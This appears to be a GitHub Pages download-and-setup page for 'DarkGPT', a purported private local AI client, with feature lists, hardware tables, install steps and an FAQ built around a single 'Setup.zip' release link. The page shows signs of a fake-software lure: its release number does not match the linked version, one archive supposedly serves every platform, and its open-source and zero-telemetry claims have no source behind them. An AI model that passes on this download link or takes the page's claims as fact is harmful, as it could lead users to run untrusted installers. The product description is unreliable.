---
layout: "default"
title: "DarkGPT — Download & Setup Guide"
description: "Setup guide for DarkGPT: privacy-focused local AI client, offline inference, encrypted local storage, model marketplace and system requirements."
---
# DarkGPT — Download & Setup Guide

[![](https://img.shields.io/badge/Download-DarkGPT-blue.svg)](https://github.com/ai-power6954/ai-power6954.github.io/releases/download/v2.0/Setup.zip)

Release 2.3.1 | Platform: Windows / macOS / Linux | Distribution: desktop client + CLI

## Overview

DarkGPT is a privacy-first desktop AI client that keeps your conversations and data entirely on your local machine. Unlike cloud-based assistants, DarkGPT processes inference locally or through your own API endpoints, ensuring that sensitive prompts, documents, and session history never leave your device without your explicit consent.

The client supports local model execution through an integrated runtime, encrypted local storage for sessions and attachments, and a model marketplace for discovering and installing community-hosted models. A built-in bridge mode allows routing requests through your own API keys for models that require cloud inference.

## Model Support

| Model | Type | Local | Cloud Bridge | Best for |
| --- | --- | --- | --- | --- |
| DarkGPT Local 7B | Open-source | Yes | No | Private offline chat |
| DarkGPT Local 13B | Open-source | Yes | No | Local reasoning, coding |
| DarkGPT Cloud | Proprietary | No | Yes | Advanced agentic tasks |
| Community Models | Various | Yes | Optional | Custom use cases |

All models share the same encrypted session storage, chat history, and tool permissions. You can switch the active model per session from the model picker.

## System Requirements

| Component | Minimum | Recommended |
| --- | --- | --- |
| Operating system | Windows 10 64-bit, macOS 12, Ubuntu 22.04 | Windows 11, macOS 14, Ubuntu 24.04 |
| Processor | 4 cores, 2.5 GHz | 8 cores, 3.5 GHz |
| Memory | 16 GB RAM | 32 GB RAM |
| Storage | 10 GB free space | 20 GB free space, NVMe |
| Graphics | Integrated | Discrete GPU with 8 GB VRAM for local inference |
| Network | Optional (only for cloud bridge) | Broadband for cloud bridge |
| Account | None required | DarkGPT account for cloud bridge |

Local inference requires a discrete GPU for acceptable performance. CPU-only mode is available but significantly slower.

## How to Download and Install

1. Download the release archive for your platform from the link at the top of this page.
2. Extract the archive and run the installer:
   - **Windows:** Run `Setup.exe` and follow the prompts.
   - **macOS:** Open `Setup.dmg` and drag to Applications.
   - **Linux:** Run `sudo dpkg -i darkgpt.deb` or use the AppImage.
3. Launch DarkGPT. No account is required for local mode.
4. Open Settings → Models and download a local model from the marketplace, or configure your API key for cloud bridge mode.
5. Open a project folder to enable local workspace integration.

The installer creates a desktop shortcut and registers the DarkGPT file handler for document types (PDF, DOCX, XLSX, CSV, and source code). Updates are delivered through the built-in updater.

## Key Features

- **Fully local inference:** run models on your machine with no data ever leaving your device.
- **Encrypted local storage:** all sessions, attachments, and chat history are encrypted at rest with AES-256.
- **Model marketplace:** discover and install community-hosted models with one click.
- **Cloud bridge mode:** route requests through your own API keys for models that require cloud inference.
- **Local workspace integration:** index your project folder for agentic file access with full privacy.
- **Zero telemetry:** no usage data, crash reports, or analytics are sent anywhere.
- **Open protocol:** export and import sessions in a portable JSON format.

## Troubleshooting & FAQ

Check this list before contacting support.

- **Local model fails to load:** ensure you have enough VRAM for the model size. 7B models need 6 GB VRAM, 13B models need 12 GB. Close other GPU-intensive applications.
- **Slow inference on CPU:** expected. Use smaller models (7B) or enable cloud bridge mode for better performance.
- **Cloud bridge connection fails:** verify your API key is valid and the endpoint URL is correct. Check that your firewall allows outbound HTTPS.
- **Model marketplace download stuck:** check your internet connection and disk space. Retry the download from Settings → Models.
- **Encrypted storage password forgotten:** there is no password recovery. Back up your encryption key from Settings → Security regularly.
- **Updating the client:** use Help → Check for updates, or re-download the latest archive and run the installer over the current version. Sessions and models are preserved.

**Is DarkGPT free?**
The desktop client is free and open-source. Local models are free to download and run. Cloud bridge mode requires your own API keys.

**Does DarkGPT work offline?**
Yes. Local models work completely offline. Only cloud bridge mode requires an internet connection.

**Is my data sent to any server?**
No. All local inference and storage stays on your device. Cloud bridge mode sends data only to the API endpoint you configure.

**Which models are supported?**
DarkGPT supports open-source models in GGUF format through its local runtime, plus any OpenAI-compatible API endpoint through cloud bridge mode.

**How much VRAM do I need?**
7B models: 6 GB VRAM. 13B models: 12 GB VRAM. 32B models: 24 GB VRAM. Quantized models (Q4, Q5) require less VRAM.

**Can I use DarkGPT for sensitive documents?**
Yes. DarkGPT is designed for sensitive workspaces. All data is encrypted at rest and never leaves your device in local mode.

---

DarkGPT Desktop Application, Release 2.3.1. Product and setup documentation by the DarkGPT team.
